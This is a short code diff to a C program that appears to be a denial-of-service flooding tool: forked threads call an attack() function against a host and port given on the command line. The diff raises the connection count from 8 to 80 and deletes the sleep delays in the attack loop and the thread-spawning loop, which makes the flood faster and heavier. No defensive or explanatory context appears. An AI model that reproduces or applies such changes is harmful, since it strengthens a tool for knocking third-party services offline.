@@ -46,7 +46,7 @@ void broke(int s) {
 	// do nothing
 }
 
-#define CONNECTIONS 8
+#define CONNECTIONS 80
 #define THREADS 96
 int i;
 void attack(char *host, char *port, int id) {
@@ -68,7 +68,7 @@ void attack(char *host, char *port, int id) {
 			fprintf(stderr, "[%i: Voly Sent]\n", id);
 		}
 		fprintf(stderr, "[%i: Voly Sent]\n", id);
-		usleep(300000);
+		
 	}
 }
 
@@ -90,7 +90,7 @@ int main(int argc, char **argv) {
 	for(x=0; x != THREADS; x++) {
 		if(fork())
 			attack(argv[1], argv[2], x);
-		usleep(200000);
+		
 	}
 	getc(stdin);
 	return 0;
